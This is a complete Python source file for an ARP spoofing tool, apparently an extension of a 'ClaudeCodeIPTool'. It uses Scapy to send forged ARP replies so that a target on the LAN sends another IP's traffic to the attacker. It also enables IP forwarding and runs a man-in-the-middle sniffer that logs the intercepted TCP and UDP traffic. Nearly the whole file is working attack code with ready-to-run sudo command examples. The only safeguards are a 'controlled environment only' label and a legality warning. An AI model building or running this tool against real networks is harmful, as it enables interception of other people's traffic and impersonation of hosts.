#!/usr/bin/env python3
"""
ARP Spoof Module - ClaudeCodeIPTool Bidirectional Extension
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Enables bidirectional IP spoofing via ARP cache poisoning.
Target thinks your MAC address belongs to spoofed IP (e.g., 75.142.10.8).

How It Works:
1. Send forged ARP responses to target
2. Target updates ARP cache: 75.142.10.8 → Your MAC address
3. Target sends packets for 75.142.10.8 to YOU
4. You receive responses (bidirectional achieved)

Requirements:
- Same Layer 2 network as target (LAN, not Internet)
- Root/sudo for raw socket access
- IP forwarding enabled (to relay traffic)

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import sys
import argparse
import time
import signal
import threading
from scapy.all import (
    ARP, Ether, IP, TCP, UDP, sendp, sniff, get_if_hwaddr,
    get_if_addr, conf, srp
)

conf.verb = 0


class ARPSpoofer:
    """
    ARP cache poisoning for bidirectional IP spoofing.

    Attack Flow:
    ┌──────────┐         ARP Reply          ┌────────┐
    │ Attacker ├──"75.142.10.8 is at       │ Target │
    │          │   MY_MAC_ADDRESS"────────>│        │
    └──────────┘                            └────────┘
                                               │
         ┌─────────────────────────────────────┘
         │ Target sends packets for 75.142.10.8
         │ to attacker's MAC (not real 75.142.10.8)
         ▼
    ┌──────────┐
    │ Attacker │ ← Receives responses (bidirectional!)
    └──────────┘
    """

    def __init__(self, target_ip, spoof_ip, interface=None, verbose=False):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface or conf.iface
        self.verbose = verbose
        self.running = False
        self.packet_count = 0

        # Get our MAC address
        self.our_mac = get_if_hwaddr(self.interface)
        self.our_ip = get_if_addr(self.interface)

        # Resolve target MAC
        self.target_mac = self._get_mac(target_ip)
        if not self.target_mac:
            raise ValueError(f"Could not resolve MAC for {target_ip}")

        # Resolve real spoofed IP's MAC (for restoration)
        self.real_spoof_mac = self._get_mac(spoof_ip)

        self.log(f"Interface: {self.interface}", "INFO")
        self.log(f"Our MAC: {self.our_mac}", "INFO")
        self.log(f"Target: {target_ip} ({self.target_mac})", "INFO")
        self.log(f"Spoofing as: {spoof_ip}", "INFO")

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["RESULT", "ATTACK", "RESTORE"]:
            timestamp = time.strftime("%H:%M:%S")
            prefix = {
                "ATTACK": "[⚡]",
                "RESTORE": "[🔧]",
                "RESULT": "[+]",
                "INFO": "[*]",
                "DEBUG": "[·]"
            }.get(level, "[ ]")
            print(f"[{timestamp}] {prefix} {msg}")

    def _get_mac(self, ip):
        """Resolve IP to MAC address via ARP request"""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=2, verbose=0, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            self.log(f"MAC resolution failed for {ip}: {e}", "DEBUG")
        return None

    def poison(self):
        """
        Send forged ARP response to target.

        Tells target: "The MAC address for spoof_ip is MY MAC"
        """
        pkt = Ether(dst=self.target_mac, src=self.our_mac) / \
              ARP(op=2,  # ARP reply
                  psrc=self.spoof_ip,  # Spoofed IP
                  hwsrc=self.our_mac,  # Our MAC (the lie)
                  pdst=self.target_ip,  # Target IP
                  hwdst=self.target_mac)  # Target MAC

        sendp(pkt, verbose=0, iface=self.interface)
        self.packet_count += 1

    def restore(self):
        """
        Restore target's ARP cache to correct mapping.

        Tells target: "The REAL MAC address for spoof_ip is X"
        """
        if not self.real_spoof_mac:
            self.log(f"Cannot restore: {self.spoof_ip} MAC unknown", "DEBUG")
            return

        pkt = Ether(dst=self.target_mac, src=self.real_spoof_mac) / \
              ARP(op=2,
                  psrc=self.spoof_ip,
                  hwsrc=self.real_spoof_mac,  # Real MAC
                  pdst=self.target_ip,
                  hwdst=self.target_mac)

        # Send multiple times to ensure it overwrites our poison
        for _ in range(5):
            sendp(pkt, verbose=0, iface=self.interface)
            time.sleep(0.1)

        self.log(f"ARP cache restored for {self.target_ip}", "RESTORE")

    def start(self, interval=2):
        """
        Start continuous ARP spoofing.

        Args:
            interval: Seconds between ARP poison packets (default: 2)
        """
        self.running = True
        self.log("ARP spoofing started (press Ctrl+C to stop)", "ATTACK")

        try:
            while self.running:
                self.poison()
                if self.verbose:
                    self.log(f"Poisoned {self.target_ip} (count: {self.packet_count})", "DEBUG")
                time.sleep(interval)
        except KeyboardInterrupt:
            self.log("\nStopping ARP spoofing...", "INFO")
        finally:
            self.stop()

    def stop(self):
        """Stop spoofing and restore ARP cache"""
        self.running = False
        self.restore()
        self.log(f"Sent {self.packet_count} ARP poison packets", "RESULT")

    def enable_ip_forwarding(self):
        """Enable IP forwarding to relay traffic"""
        import subprocess
        try:
            # Linux
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                          check=True, capture_output=True)
            self.log("IP forwarding enabled", "INFO")
            return True
        except Exception as e:
            self.log(f"Failed to enable IP forwarding: {e}", "DEBUG")
            return False

    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        import subprocess
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'],
                          check=True, capture_output=True)
            self.log("IP forwarding disabled", "INFO")
        except Exception:
            pass


class MITMProxy:
    """
    MITM traffic interceptor for ARP spoofed sessions.
    Captures and displays traffic between target and spoofed IP.
    """

    def __init__(self, target_ip, spoof_ip, interface=None, verbose=False):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface or conf.iface
        self.verbose = verbose
        self.packet_count = 0
        self.running = False

    def packet_callback(self, pkt):
        """Process intercepted packets"""
        if not pkt.haslayer(IP):
            return

        src = pkt[IP].src
        dst = pkt[IP].dst

        # Traffic between target and spoofed IP
        if (src == self.target_ip and dst == self.spoof_ip) or \
           (src == self.spoof_ip and dst == self.target_ip):

            self.packet_count += 1

            direction = "→" if src == self.target_ip else "←"
            proto = "TCP" if pkt.haslayer(TCP) else \
                    "UDP" if pkt.haslayer(UDP) else "IP"

            if pkt.haslayer(TCP):
                sport = pkt[TCP].sport
                dport = pkt[TCP].dport
                flags = pkt[TCP].flags
                print(f"[{self.packet_count:4d}] {src}:{sport} {direction} {dst}:{dport} [{proto} {flags}]")
            elif pkt.haslayer(UDP):
                sport = pkt[UDP].sport
                dport = pkt[UDP].dport
                print(f"[{self.packet_count:4d}] {src}:{sport} {direction} {dst}:{dport} [{proto}]")
            else:
                print(f"[{self.packet_count:4d}] {src} {direction} {dst} [{proto}]")

    def start(self):
        """Start packet capture"""
        self.running = True
        print(f"\n[*] Intercepting traffic between {self.target_ip} ↔ {self.spoof_ip}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Press Ctrl+C to stop\n")

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_callback,
                store=0,
                filter=f"host {self.target_ip} or host {self.spoof_ip}"
            )
        except KeyboardInterrupt:
            print(f"\n[+] Captured {self.packet_count} packets")


def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoof Module - Bidirectional IP Spoofing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic ARP spoofing (make target think you're 75.142.10.8)
  sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8

  # With traffic interception (MITM)
  sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8 --intercept

  # Custom interval (faster poisoning)
  sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8 --interval 1

  # Restore ARP cache only
  sudo python3 arp-spoof.py restore 192.168.1.100 --spoof-ip 75.142.10.8

Requirements:
  - Same network as target (Layer 2 adjacency)
  - Root/sudo for raw sockets
  - IP forwarding enabled (auto-enabled by tool)

Note: CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
      ARP spoofing on unauthorized networks is illegal.
        """
    )

    subparsers = parser.add_subparsers(dest='mode', help='Operating mode')

    # Spoof mode
    spoof_parser = subparsers.add_parser('spoof', help='Start ARP spoofing')
    spoof_parser.add_argument('target', help='Target IP address')
    spoof_parser.add_argument('--spoof-ip', required=True, help='IP to spoof (e.g., 75.142.10.8)')
    spoof_parser.add_argument('--interface', help='Network interface (default: auto)')
    spoof_parser.add_argument('--interval', type=int, default=2,
                              help='Seconds between ARP packets (default: 2)')
    spoof_parser.add_argument('--intercept', action='store_true',
                              help='Intercept and display traffic (MITM mode)')
    spoof_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Restore mode
    restore_parser = subparsers.add_parser('restore', help='Restore ARP cache')
    restore_parser.add_argument('target', help='Target IP address')
    restore_parser.add_argument('--spoof-ip', required=True, help='IP that was spoofed')
    restore_parser.add_argument('--interface', help='Network interface (default: auto)')

    args = parser.parse_args()

    if args.mode is None:
        parser.print_help()
        sys.exit(1)

    # Mode dispatch
    if args.mode == 'spoof':
        spoofer = ARPSpoofer(args.target, args.spoof_ip, args.interface, args.verbose)

        # Enable IP forwarding for packet relay
        spoofer.enable_ip_forwarding()

        # Setup signal handler for clean shutdown
        def signal_handler(sig, frame):
            print("\n[*] Caught interrupt signal")
            spoofer.stop()
            spoofer.disable_ip_forwarding()
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        # Start MITM proxy if requested
        if args.intercept:
            proxy = MITMProxy(args.target, args.spoof_ip, args.interface, args.verbose)

            # Run spoofing in background thread
            spoof_thread = threading.Thread(target=spoofer.start, args=(args.interval,))
            spoof_thread.daemon = True
            spoof_thread.start()

            # Run MITM in foreground
            try:
                proxy.start()
            finally:
                spoofer.stop()
                spoofer.disable_ip_forwarding()
        else:
            # Run spoofing only
            try:
                spoofer.start(args.interval)
            finally:
                spoofer.disable_ip_forwarding()

    elif args.mode == 'restore':
        spoofer = ARPSpoofer(args.target, args.spoof_ip, args.interface, verbose=True)
        spoofer.restore()


if __name__ == "__main__":
    main()
